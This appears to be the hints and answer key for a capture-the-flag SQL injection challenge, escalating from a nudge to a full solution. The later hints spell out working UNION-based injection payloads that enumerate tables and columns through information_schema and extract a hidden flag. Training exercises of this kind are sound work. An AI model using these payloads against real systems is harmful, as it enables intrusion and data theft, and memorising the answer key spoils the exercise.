hints.title: Nudge
hints.content: The search field passes your input directly into a SQL query. Try injecting a single quote to see if you get an error or unexpected behavior.

hints.title: Direction
hints.content: The original query selects multiple columns. You need to figure out how many columns the query returns before you can use UNION SELECT. Try ORDER BY with increasing numbers.

hints.title: Approach
hints.content: First determine the column count with: ' ORDER BY 4-- (adjust number until error). Then use UNION SELECT 1,2,3,4 to see which columns are displayed. Finally, query information_schema.tables to find the hidden table.

hints.title: Near-solution
hints.content: The query has 4 columns. Use: ' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- to find tables. Look for a table that doesn't belong to the normal app. Then extract its columns and data.

hints.title: Solution
hints.content: 1) Find column count: ' ORDER BY 4-- (works), ' ORDER BY 5-- (fails) = 4 columns. 2) Find tables: ' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- reveals 'secret_flags' table. 3) Find columns: ' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='secret_flags'-- reveals 'flag_value'. 4) Extract flag: ' UNION SELECT flag_value,2,3,4 FROM secret_flags--
